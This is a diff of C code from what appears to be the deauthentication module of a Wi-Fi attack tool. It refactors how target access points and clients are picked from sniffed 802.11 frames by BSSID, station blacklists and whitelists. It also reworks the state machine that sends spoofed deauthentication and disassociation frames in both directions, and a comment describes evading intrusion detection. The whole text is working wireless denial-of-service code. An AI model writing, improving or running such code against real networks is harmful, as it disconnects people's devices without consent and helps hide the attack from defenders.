@@ -168,8 +168,50 @@ struct ether_addr get_target_bssid()
 	return mac_block;
 }
 
-unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
+unsigned char accept_target(struct packet *pkt, struct deauth_options *dopt) {
+  struct ether_addr smac = {0};
+	struct ether_addr dmac = {0};
+	struct ether_addr bssid = {0};
+	struct ether_addr tmac = {0};
+
+  struct ether_addr ap = {0};
+  struct ether_addr client = {0};
+
+  uint8_t dsflags;
+
   struct ieee_hdr *hdr = (struct ieee_hdr *) pkt->data;
+  dsflags = hdr->flags & 0x03;
+
+  if((hdr->type & 0x0F) != CONTROL_FRAME)
+	{
+			switch (dsflags) {
+				case 0x00: //Ad Hoc, Beacons
+				memcpy(dmac.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(smac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(bssid.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
+				break;
+				case 0x01: //From station to AP
+				memcpy(bssid.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(smac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(dmac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
+
+				break;
+				case 0x02: //From AP to station
+				memcpy(dmac.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(bssid.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(smac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
+				break;
+				case 0x03: //WDS
+				memcpy(bssid.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(tmac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(dmac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
+				memcpy(smac.ether_addr_octet, pkt->data + sizeof(struct ieee_hdr), ETHER_ADDR_LEN);
+				break;
+			}
+	}
+  else{
+    return 1;
+  }
 
   //if (! greylist) return 1; //Always accept when no black/whitelisting selected
   if(dopt->blacklist_from_file == 0 && dopt->blacklist_from_essid == 0 && 
@@ -190,8 +232,7 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
 
   if(dopt->blacklist_from_bssid == 1 && dopt->blacklist_from_station == 1)
   {
-    if((MAC_MATCHES(bssid_block, hdr->addr1) || MAC_MATCHES(bssid_block, hdr->addr2) || MAC_MATCHES(bssid_block, hdr->addr3)) &&
-      (MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3)))
+    if(MAC_MATCHES(bssid_block, bssid) && (MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac)))
     {
       return 1;
     }
@@ -201,8 +242,7 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
 
   if(dopt->blacklist_from_essid == 1 && dopt->blacklist_from_station == 1)
   {
-    if((MAC_MATCHES(essid_mac_block, hdr->addr1) || MAC_MATCHES(essid_mac_block, hdr->addr2) || MAC_MATCHES(essid_mac_block, hdr->addr3)) &&
-      (MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3)))
+    if((MAC_MATCHES(essid_mac_block, bssid)) && (MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac)))
     {
       return 1;
     }
@@ -212,11 +252,11 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
 
   if(dopt->blacklist_from_bssid == 1)
   {
-   if(MAC_MATCHES(bssid_block, hdr->addr1) || MAC_MATCHES(bssid_block, hdr->addr2) || MAC_MATCHES(bssid_block, hdr->addr3))
+   if(MAC_MATCHES(bssid_block, bssid))
    {
       if(dopt->whitelist_from_station == 1)
       {
-        if(MAC_MATCHES(white_mac, hdr->addr1) || MAC_MATCHES(white_mac, hdr->addr2) || MAC_MATCHES(white_mac, hdr->addr3))
+        if(MAC_MATCHES(white_mac, smac) || MAC_MATCHES(white_mac, dmac))
           return 0;
       }
 
@@ -237,11 +277,11 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
 
   if(dopt->blacklist_from_essid == 1)
   {
-     if(MAC_MATCHES(essid_mac_block, hdr->addr1) || MAC_MATCHES(essid_mac_block, hdr->addr2) || MAC_MATCHES(essid_mac_block, hdr->addr3))
+     if(MAC_MATCHES(essid_mac_block, bssid))
      {
         if(dopt->whitelist_from_station == 1)
         {
-          if(MAC_MATCHES(white_mac, hdr->addr1) || MAC_MATCHES(white_mac, hdr->addr2) || MAC_MATCHES(white_mac, hdr->addr3))
+          if(MAC_MATCHES(white_mac, smac) || MAC_MATCHES(white_mac, dmac))
             return 0;
         }
 
@@ -262,7 +302,7 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
 
   if(dopt->blacklist_from_station == 1)
   {
-      if(MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3))
+      if(MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac))
         return 1;
   }
 
@@ -293,8 +333,8 @@ unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
   return 0;
 }
 
-unsigned char get_new_target1(struct ether_addr *client, struct ether_addr *ap, struct deauth_options *dopt) {
-  struct packet sniffed;
+unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, struct deauth_options *dopt) {
+  struct packet sniffed = {0};
   struct ieee_hdr *hdr;
   unsigned char wds = 0;
 
@@ -319,15 +359,6 @@ unsigned char get_new_target1(struct ether_addr *client, struct ether_addr *ap, 
     }
   }
 
-    /*if ((hdr->type != IEEE80211_TYPE_DATA) &&
-  (hdr->type != IEEE80211_TYPE_QOSDATA) &&
-  (hdr->type != IEEE80211_TYPE_NULL) &&
-  (hdr->type != IEEE80211_TYPE_AUTH) &&
-  (hdr->type != IEEE80211_TYPE_ASSOCREQ) &&
-  (hdr->type != IEEE80211_TYPE_ASSOCRES) &&
-  (hdr->type != IEEE80211_TYPE_REASSOCREQ)&&
-  (hdr->type != IEEE80211_TYPE_ACTION))
-    continue;*/
     if((hdr->type & 0x0F) != 0x00 && (hdr->type & 0x0F) != 0x08)
       continue;
 
@@ -336,25 +367,23 @@ unsigned char get_new_target1(struct ether_addr *client, struct ether_addr *ap, 
 
     if (dopt->stealth && ((hdr->flags & 0x03) != 0x01)) continue; //In stealth mode do not impersonate AP, IDS will figure out the duplicate SEQ number!
 
-    if (accept_target1(&sniffed, dopt)) break;
+    if (accept_target(&sniffed, dopt)) break;
   }
 
   switch (hdr->flags & 0x03) {
     case 0x03: //WDS
       wds = 1;
-      MAC_COPY(*client, hdr->addr1);
-      MAC_COPY(*ap, hdr->addr2);
+      MAC_COPY(*client, hdr->addr3);
+      MAC_COPY(*ap, hdr->addr1);
     break;
     case 0x01: //ToDS
-      MAC_COPY(*client, hdr->addr2);
-      MAC_COPY(*ap, hdr->addr3);
+      MAC_COPY(*client, hdr->addr3);
+      MAC_COPY(*ap, hdr->addr2);
     break;
     case 0x02: //FromDS
-      //if(hdr->type == IEEE80211_TYPE_DATA)
-      //  MAC_COPY(*client, hdr->addr3);
-      //else
       MAC_COPY(*client, hdr->addr1);
-      MAC_COPY(*ap, hdr->addr3);
+      MAC_COPY(*ap, hdr->addr2);
+
     break;
     case 0x00: //NoDS (AdHoc)
       MAC_COPY(*client, hdr->addr2);
@@ -372,6 +401,7 @@ struct packet deauth_getpacket(void *options) {
   struct deauth_options *dopt = (struct deauth_options *) options;
   static time_t t_prev = 0;
   static unsigned char wds, state = 0;
+  struct packet pkt= {0};
 
   /*if (dopt->greylist) {
     if (t_prev == 0) {
@@ -402,38 +432,46 @@ struct packet deauth_getpacket(void *options) {
 
   if (dopt->speed) sleep_till_next_packet(dopt->speed);
 
-  switch (state) {
-    case 0:
-      //wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist, dopt->stealth);
-      wds = get_new_target1(&station, &bssid, dopt);
-      state = 1;
-      return create_deauth(bssid, station, bssid);
-    break;
-    case 1:
-      state = 2;
-      if (wds) state = 4;
-      if (dopt->stealth) state = 0;
-      return create_disassoc(bssid, station, bssid);
-    break;
-    case 2:
-      state = 3;
-      return create_deauth(station, bssid, bssid);
-    break;
-    case 3:
-      state = 0;
-      return create_disassoc(station, bssid, bssid);
-    break;
-    case 4:
-      state = 5;
-      return create_deauth(station, bssid, station);
-    break;
-    case 5:
-      state = 0;
-      return create_disassoc(station, bssid, station);
-    break;
+  get_new_target(&station, &bssid, dopt);
+
+  if(!MAC_MATCHES(bssid, station))
+  {
+    switch (state) {
+      case 0:
+        //wds = get_new_target(&station, &bssid, dopt);
+        state = 1;
+        return create_deauth(bssid, station, bssid);
+      break;
+      case 1:
+        state = 2;
+        //if (wds) state = 4;
+        //if (dopt->stealth) state = 0;
+        return create_disassoc(bssid, station, bssid);
+      break;
+      case 2:
+        state = 3;
+        return create_deauth(station, bssid, bssid);
+      break;
+      case 3:
+        //state = 0;
+        state = 4;
+        return create_disassoc(station, bssid, bssid);
+      break;
+      case 4:
+        state = 5;
+        return create_deauth(station, bssid, station);
+      break;
+      case 5:
+        state = 0;
+        return create_disassoc(station, bssid, station);
+      break;
+    }
+
+    printf("\nIMPOSSIBLE! state = %d\n", state); exit(-1);
   }
 
-  printf("\nIMPOSSIBLE!\n"); exit(-1);
+  return pkt;
+
 }
 
 
@@ -441,14 +479,19 @@ void deauth_print_stats(void *options) {
   int chan = osdep_get_channel();
   options = options; //Avoid unused warning
 
-  printf("\rDisconnecting "); print_mac(station);
-  printf(" from "); print_mac(bssid);
+  if(!MAC_MATCHES(bssid, station))
+  {
+    printf("\rDisconnecting "); print_mac(station);
+    printf(" from "); print_mac(bssid);
 
-  if (chan) {
-    printf(" on channel %d\n", chan);
-  } else {
-    printf("\n");
+    if (chan) {
+      printf(" on channel %d\n", chan);
+    } else {
+      printf("\n");
+    }
   }
+
+  
 }
 
 
